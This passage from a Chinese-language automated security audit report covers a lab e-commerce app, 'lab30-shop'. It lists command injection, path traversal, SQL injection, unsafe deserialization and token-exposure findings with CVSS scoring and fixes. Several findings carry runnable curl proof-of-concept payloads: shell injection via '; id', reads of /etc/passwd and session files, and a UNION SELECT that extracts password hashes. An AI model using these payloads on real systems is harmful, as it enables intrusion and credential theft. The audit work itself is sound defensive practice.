| C | N | 不读取敏感数据 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可向 jobs 表插入作业记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接服务中断证据 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `59f3b6a6e792422c8d3efebdedf79f1f`

- ops/batch-check.php 经 host_check() 将 GET host 拼入 shell_exec 造成命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：inconclusive）
  来源 `faf45aee218e4b48bbc58d1d6235b3f8` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/host_check.php', 'start_line': 1, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 34, 'end_line': 35}]
  结论：batch-check.php 第 2 行取 $_GET['host'] 后直接传给 host_check()，host_check.php 第 2 行用 shell_exec('ping -c 1 -W 1 ' . $host) 拼接执行。攻击者控制 host 值即可注入任意命令，仅 require_user(['operator','admin']) 校验角色，存在 operator/admin 会话即可触发。
  输入：HTTP GET 参数 host
  传播：$_GET['host'] -> host_check($host) -> shell_exec('ping -c 1 -W 1 ' . $host)
  危险操作：shell_exec 执行系统命令
  保护：require_user(['operator','admin']) 仅限制角色，未对 host 做任何转义或白名单
  前提：['持有 operator 或 admin 角色的有效会话']
  修复建议：使用参数数组调用 ping 或对该值做严格 IP/主机名白名单校验，禁止 shell 拼接。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:44:12.039495+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP GET 参数经 public 页面路由进入 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | GET host 直接拼接，无需特殊条件 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 仅要求 operator/admin 角色登录会话 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | GET 请求由攻击者发起，无其他用户参与 | lab30-shop/app/public/ops/batch-check.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 在同一 web 应用进程上下文中执行命令 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | shell_exec 可以 cat 任意可读文件/进程数据 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意命令可修改应用文件 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 可终止服务进程 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'batch_check_poc.sh', 'language': 'bash', 'script': 'curl -s -G \'http://TARGET/ops/batch-check.php\' --cookie \'SHOPSESSID=SID\' --data-urlencode "host=127.0.0.1; id"', 'instructions': '以 operator/admin 账号登录取得 SHOPSESSID，将 TARGET 与 SID 替换后发送请求；观察页面 pre 中是否出现命令输出。', 'normal_input': 'host=127.0.0.1', 'attack_input': 'host=127.0.0.1; id', 'expected_result': '攻击请求返回 ping 输出之外还包含 uid=... 的命令输出，正常请求仅有 ping 结果。'}
````


### 台账 `cbb2a8f975a04f37a2d4e310004c6d5d`

- ops/ping.php 将 GET host 拼入 shell_exec 造成运营端命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：verified）
  来源 `8068b65b2f9b467596cf9baa8f71ed11` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/ping.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 34, 'end_line': 35}]
  结论：ping.php 第 2 行读取 $_GET['host']，当非空时直接拼接进 shell_exec('ping -c 1 -W 1 '.$host)，无转义/白名单，仅有 require_user(['operator','admin']) 角色校验，运营角色会话即可执行任意命令。
  输入：HTTP GET 参数 host
  传播：$_GET['host'] -> 'ping -c 1 -W 1 '.$host -> shell_exec
  危险操作：shell_exec 执行系统命令
  保护：require_user(['operator','admin']) 角色校验，未做参数字符/格式过滤
  前提：['持有 operator 或 admin 角色的有效会话']
  修复建议：改用参数化命令执行或在拼接前严格校验 IP/主机名白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:44:12.040547+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 经 public 页面 GET 参数进入 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 参数直接拼接，无过滤 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 仅需 operator/admin 登录会话 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自发 GET 请求 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一 web 进程内执行 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 能读取文件与系统信息 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 能改写应用文件 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 能破坏服务可用性 | lab30-shop/app/public/ops/ping.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `7b6ba6dd3c294adcb2a9a87b4f0906cd`

- support/download.php 的 file 参数未过滤导致路径遍历/任意文件读取（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：inconclusive）
  来源 `2b2a4c88101c4da3a4c4548afcace65d` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/support/download.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 9, 'end_line': 9}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 14, 'end_line': 14}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 34}]
  结论：download.php 第3行将用户控制的 file 参数与 data_dir().'/docs/' 直接拼接，仅在 is_file 检查后 file_get_contents 读取并回显，没有 basename、白名单或 realpath 前缀校验，攻击者可传入 ../ 序列越出 docs 目录读取任意文件。
  输入：GET 参数 file
  传播：$_GET['file'] -> (string) 拼接 $path = data_dir().'/docs/'.$file -> is_file 检查 -> file_get_contents($path) -> echo 输出
  危险操作：file_get_contents 读取拼接路径所示文件并回显内容
  保护：仅有 is_file 存在性检查；require_user 只要求登录，不做路径约束；data_dir 默认 /var/lib/shop，会话目录 /var/lib/shop/sessions 也在其中，../sessions/... 可越出 docs
  前提：['攻击者需拥有任意登录账号；SHOP_DATA_DIR 可读且目标文件可读']
  修复建议：使用 basename() 取文件名，或对 realpath($path) 做前缀校验确保位于 data_dir().'/docs/' 内，并维护允许下载的文件白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:55:40.916043+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需构造 file=../ 路径，无需竞争或特殊时序 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 第2行 require_user() 要求已登录用户，任意普通账号即可 | lab30-shop/app/public/support/download.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起请求即可 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 读取宿主文件系统内容，不改变授权边界组件 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 docs 目录之外的任意可读文件，如会话文件或配置 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:14-14 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取，无写入 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏可用性的操作 | lab30-shop/app/public/support/download.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'download_traversal.sh', 'language': 'bash', 'script': "curl -s -b 'SHOPSESSID=<valid_session>' 'http://target/support/download.php?file=../sessions/sess_<sid>'", 'instructions': '登录取得会话后将有效 SHOPSESSID 与目标路径替换，访问 download.php 并观察返回内容是否为 docs 目录之外的文件。', 'normal_input': '?file=shipping.txt', 'attack_input': '?file=../../../../etc/passwd', 'expected_result': '正常输入返回配送说明文本；攻击输入返回 /etc/passwd 内容，证明可越出 docs 目录读取任意文件。'}
````


### 台账 `736a703ead8d4ee687c78598741e965a`

- 会员备份恢复对用户序列化数据不安全反序列化并直接写入用户记录（CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N，验证：inconclusive）
  来源 `e9f49daaf01b418a9c8d49cba07136d1` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/account/backup.php', 'start_line': 2, 'end_line': 6}, {'path': 'lab30-shop/app/src/backup.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 40}]
  结论：backup.php:4-5 对 $_POST['backup'] 做 base64 解码后直接 unserialize，且未设置 allowed_classes，仅后续 instanceof 检查；第 6 行把反序列化对象的 tier 与 displayName 直接 UPDATE 到 users 表。登录用户可通过合法页面获取 CSRF 令牌，构造 MemberBackup 序列化字符串并任意设置这两个字段，覆盖自身会员等级展示与昵称，属于不安全反序列化导致的可控属性写入。src/backup.php 的 MemberBackup 无 __wakeup/__destruct，类内不存在文件写、include 或 shell 执行 sink，因此未证实代码执行链。
  输入：POST 参数 backup（base64 编码的 PHP 序列化字符串）
  传播：$_POST['backup'] -> base64_decode -> unserialize -> instanceof MemberBackup -> $restored->tier / $restored->displayName -> UPDATE users
  危险操作：unserialize 用户可控数据并将反序列化对象属性持久化到用户表
  保护：require_user() 与 check_csrf() 仅保证登录和会话令牌；unserialize 未限制 allowed_classes 或使用 JSON，字段值未校验
  前提：['攻击者持有任意已登录账户（customer 角色）并能获得当前会话 CSRF 令牌']
  修复建议：不要反序列化客户端数据；使用 JSON 并只接受白名单字段、校验取值，或对 unserialize 使用 allowed_classes=false 并显式验证基本类型。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:56:43.294682+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 提交 POST backup 字段 | lab30-shop/app/public/account/backup.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 登录用户可自行获取 CSRF 令牌并构造 base64 序列化数据 | lab30-shop/app/public/account/backup.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:39-40 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user() 仅要求登录，任意 customer 角色可用 | lab30-shop/app/public/account/backup.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者提交自己的备份即可触发 | lab30-shop/app/public/account/backup.php:3-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响同一用户记录字段，未跨授权边界 | lab30-shop/app/public/account/backup.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 本类无读取或回显敏感数据的方法 | lab30-shop/app/src/backup.php:1-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 反序列化属性被直接写入 users 表 tier/display_name | lab30-shop/app/public/account/backup.php:5-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未见对象注入导致拒绝服务或破坏 | lab30-shop/app/src/backup.php:2-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'backup_deserialization_poc.txt', 'language': 'php', 'script': '<?php\n$obj = new stdClass();\n// 实际提交需为 MemberBackup 实例序列化；此处展示攻击字段替换后 base64\n$payload = \'O:12:"MemberBackup":2:{s:4:"tier";s:6:"vip999";s:11:"displayName";s:9:"pwnedName";}\';\necho base64_encode($payload), "\\n";\n', 'instructions': '登录任意账户访问 /account/backup.php，获取表单 csrf 隐藏字段，将上面生成的 base64 字符串填入 backup 参数提交 POST。正常对照为页面原样输出的当前备份文本。', 'normal_input': '页面生成的合法 MemberBackup 序列化 base64 文本', 'attack_input': 'O:12:"MemberBackup":2:{s:4:"tier";s:6:"vip999";s:11:"displayName";s:9:"pwnedName";} 的 base64', 'expected_result': '攻击请求返回“会员备份已恢复。”且 users 表中该用户 tier=vip999、display_name=pwnedName；对照请求保留原 tier 与 display_name'}
````


### 台账 `33ecbfbd8332426288ca34753aed3074`

- ops/members.php 将 GET q 直接拼入 member_lookup 的 SQL LIKE 子句导致 SQL 注入（CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N，验证：inconclusive）
  来源 `76cf96bd2cfe43a59e5b7196ea2733b5` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/members.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/member_lookup.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 4, 'end_line': 8}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：members.php 从 $_GET['q'] 取词传入 member_lookup()（默认 alice，但不影响可控性）。member_lookup() 第3行用 db()->query("... WHERE username LIKE '%" . $term . "%'") 直接字符串拼接执行，无参数化、无转义，且 EMULATE_PREPARES=false 也不起作用。operator/admin 权限用户可注入 SQL 读取任意表（含 password_md5 等敏感字段）。
  输入：$_GET['q'] -> members.php:2
  传播：members.php:2 $term -> member_lookup($term) -> member_lookup.php:3 -> db()->query(...)
  危险操作：member_lookup.php:3 db()->query() 字符串拼接执行
  保护：仅 require_user(['operator','admin']) 角色校验，无 SQL 参数化/转义
  前提：['已登录 operator 或 admin 角色账号']
  修复建议：member_lookup 改为 db()->prepare('... WHERE username LIKE ?') 并 execute(['%'.$term.'%'])

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:59:42.613494+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | web 接口经 HTTP 访问 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接 GET 参数拼接，无需特殊条件 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 登录会话 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/public/ops/members.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用/数据库上下文 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 可读取 users 全表含密码散列等字段 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | query 执行，联合查询可有限写入但主要读取 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无直接可用性影响证据 | lab30-shop/app/src/member_lookup.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'sqli_members.sh', 'language': 'bash', 'script': '#!/bin/bash\n# 需现有 operator 会话 cookie\nCOOKIE="SHOPSESSID=<operator_sessid>"\nBASE="http://<target>"\necho CONTROL\ncurl -s -b "$COOKIE" -H \'Accept: application/json\' "$BASE/ops/members.php?q=alice"\necho ATTACK\ncurl -s -b "$COOKIE" -H \'Accept: application/json\' "$BASE/ops/members.php?q=%25%27%20UNION%20SELECT%20id,username,password_md5,role%20FROM%20users--%20"\n', 'instructions': '使用有效 operator/admin 会话调用 /ops/members.php，将 q 参数注入 UNION SELECT 读取 users.password_md5。', 'normal_input': 'q=alice', 'attack_input': "q=%' UNION SELECT id,username,password_md5,role FROM users-- ", 'expected_result': '对照返回 username=alice 的行；攻击返回 password_md5 列出现在 email 位，证明注入可跨表读取。'}
````


### 台账 `2515a6d2f04840219f7a0b7b716a2556`

- ops/batch-check.php 将 GET host 直接传入 host_check 的 shell_exec 导致命令注入（CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H，验证：verified）
  来源 `fa1327674fa04ffc81c10e2b685d0a8a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/batch-check.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/host_check.php', 'start_line': 2, 'end_line': 2}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：batch-check.php:2 从 $_GET['host'] 取值并调用 host_check($host)。host_check.php:2 执行 shell_exec('ping -c 1 -W 1 ' . $host)，拼接未过滤，可追加 shell 元字符执行任意命令。仅 require_user(['operator','admin']) 校验，无参数校验/转义。
  输入：$_GET['host'] -> batch-check.php:2
  传播：batch-check.php:2 $host -> host_check($host) -> host_check.php:2 shell_exec('ping ... '.$host)
  危险操作：host_check.php:2 shell_exec 系统命令执行
  保护：仅 operator/admin 角色校验，无输入白名单/转义
  前提：['已登录 operator 或 admin 角色账号']
  修复建议：使用 escapeshellarg($host) 并校验 host 格式；cmdfull 使用 proc_open 传参数组，绝不拼接用户值

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T17:59:42.615323+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接 GET 拼 shell，无需条件 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需要 operator/admin 登录 | lab30-shop/app/public/ops/batch-check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无其他用户参与 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 命令在应用同一主机进程上下文中执行 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 任意命令可读取服务器文件/数据 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 任意 shell 命令可修改系统状态 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | H | 任意命令可破坏可用性 | lab30-shop/app/src/host_check.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'cmd_inject_batch.sh', 'language': 'bash', 'script': '#!/bin/bash\nCOOKIE="SHOPSESSID=<operator_sessid>"\nBASE="http://<target>"\necho CONTROL\ncurl -s -b "$COOKIE" "$BASE/ops/batch-check.php?host=127.0.0.1"\necho ATTACK\ncurl -s -b "$COOKIE" "$BASE/ops/batch-check.php?host=127.0.0.1%3B%20id"\n', 'instructions': '使用 operator/admin 会话访问 /ops/batch-check.php，host 参数追加 ; id 执行任意命令，结果在 <pre> 中回显。', 'normal_input': 'host=127.0.0.1', 'attack_input': 'host=127.0.0.1; id', 'expected_result': '对照只显示 ping 输出；攻击额外显示 id 命令的用户/uid 输出。'}
````


### 台账 `40ec9be4c53d4ff08355dcde6b587325`

- 内部库存服务 /internal/status 明文返回 warehouse_key 令牌（CVSS 3.1 待评分，验证：inconclusive）
  来源 `68b3552e052c49d39459190248715536` / 修订 1
  证据：[{'path': 'lab30-shop/fixtures/server.py', 'start_line': 7, 'end_line': 7}, {'path': 'lab30-shop/fixtures/server.py', 'start_line': 33, 'end_line': 38}, {'path': 'lab30-shop/fixtures/server.py', 'start_line': 40, 'end_line': 43}, {'path': 'lab30-shop/compose.yaml', 'start_line': 52, 'end_line': 59}, {'path': 'lab30-shop/docker/fixtures.Dockerfile', 'start_line': 4, 'end_line': 5}, {'path': 'lab30-shop/README.md', 'start_line': 55, 'end_line': 55}]
  结论：server.py:7 使用 secrets.token_hex(16) 生成 INVENTORY_TOKEN；server.py:36 在 InventoryHandler.do_GET 的 /internal/status 分支直接将该令牌作为 warehouse_key 放入 JSON 响应且无任何认证或访问控制。server.py:41 将 InventoryHandler 绑定在 0.0.0.0:8082，server.py:43 启动 PartnerHandler 于 8080；compose.yaml:52-59 将 fixtures 服务纳入 shop 网络，docker/fixtures.Dockerfile:4 暴露 8082。README.md:55 将该 8082 描述为“内部库存服务”“仅项目网络可访问”，说明该令牌预期不应公开，但任何能访问 8082 的同网络客户端均可读取。
  输入：到达 fixtures 容器 8082 端口且请求 /internal/status 的 HTTP 客户端（同项目网络容器或串联获得网络请求能力的外部攻击者）
  传播：GET /internal/status -> InventoryHandler.do_GET 固定路径匹配 -> send_body(json.dumps({'warehouse_key': INVENTORY_TOKEN,...}))
  危险操作：将内部库存令牌 INVENTORY_TOKEN 明文写入 HTTP 响应体
  保护：8082 未映射至宿主，仅项目网络可达；但同一 shop 网络内无认证或来源校验，且服务本身 0.0.0.0 监听。
  前提：['攻击者需能向 fixtures 服务的 8082 端口发起 HTTP 请求，通常需已处于 shop 项目网络或借助其它服务端请求能力。']
  修复建议：不要在状态接口中返回真实密钥；仅返回布尔状态或派生校验值；对内部端口增加认证/来源限制，必要时将内部库存服务与普通合作内容服务拆分为不同网络命名空间。

**CVSS 3.1 评分依据**

- 状态：待补充指标；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：1287aed9e8cb4ed28ed7fcc8bd8cb91b
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-27T18:01:06.813284+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | A | 8082 内部库存端口未映射至宿主，但 fixtures 加入 shop 网络，同网络容器可访问；外部用户需先获得可发起网络请求的能力。 | lab30-shop/fixtures/server.py:40-43 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/compose.yaml:52-59 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/docker/fixtures.Dockerfile:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | H | 需要具备同项目网络身份或先串联其它 SSRF/文件读取能力才能到达 8082。 | lab30-shop/compose.yaml:52-59 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/README.md:55-55 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | 待补充 | 源码未要求认证即可读取 /internal/status，但实际网络可达前提涉及容器/网络控制，权限边界无法由源码确定。 | lab30-shop/fixtures/server.py:33-38 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | 指标待补充 |
| UI | N | HTTP GET 请求无需其他用户交互。 | lab30-shop/fixtures/server.py:34-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 泄露发生在同一 fixtures 服务授权域内。 | lab30-shop/fixtures/server.py:36-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 暴露内部库存服务的 warehouse_key 令牌，但未证明该令牌可用于其他系统或导致更大数据读取。 | lab30-shop/fixtures/server.py:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/fixtures/server.py:36-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读状态接口，无写入操作。 | lab30-shop/fixtures/server.py:35-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响证据。 | lab30-shop/fixtures/server.py:35-38 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


## 覆盖与未决方向

受阻、未执行、未读取方向均不代表安全。

- blocked · profile.php 反射 XSS 与订单金额篡改的定点核对：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · member_lookup.php SQL 拼接可达性核对：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · 收窄：support/download.php 路径穿越与 auth/continue.php 开放重定向：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- completed · auth/continue.php 开放重定向与 src/backup.php 反序列化剩余方向结算：
- blocked · ops/maintenance.php 与 support/index.php 输入流与危险操作审计：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- blocked · 收窄：setup.php 输入处理与 account/backup.php MemberBackup 反序列化行为：当前结果已保存，但剩余方向未结算，需要 Planner 缩小范围或重开任务
- completed · ops/members.php、users.php 授权与 SQL 拼接，以及 batch-check.php 外部 URL 处理：
- completed · fixtures/server.py 测试夹具与请求处理审计：

## 预算与覆盖事实

```json
{
  "execution": {
    "policy_version": "audit-runtime-3",
    "phase": "ended",
    "claim_epoch": 1,
    "state_revision": 593,
    "run_limits": {
      "responses": 1024,
      "tools": 8192,
      "seconds": 5400
    },
    "run_usage": {
      "responses": 531,
      "tools": 715,
      "seconds": 4064.705
    },
    "run_remaining": {
      "responses": 493,
      "tools": 7477,
      "seconds": 1335.295
    },
    "active_executions": [],
    "stop_reason": {
      "code": "unresolved_blockers",
      "message": "一次修复规划后阻塞原因仍未改变，停止重复规划。"
    },
    "context": {
      "peak_request_bytes": 144019,
      "summary_requests": 0,
      "summary_bytes": 0,
      "compactions": 0,
      "dropped_groups": 0,
      "limit_hits": 0,
      "history_bytes": 393216,
      "phases": {
        "planner_explore": {
          "peak_request_bytes": 121379,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_decision": {
          "peak_request_bytes": 105364,
          "requests": 2,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "planner_publish": {
          "peak_request_bytes": 71414,
          "requests": 3,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_execute": {
          "peak_request_bytes": 144019,
          "requests": 6,
          "summary_requests": 0,
          "limit_hits": 0
        },
        "task_publish": {
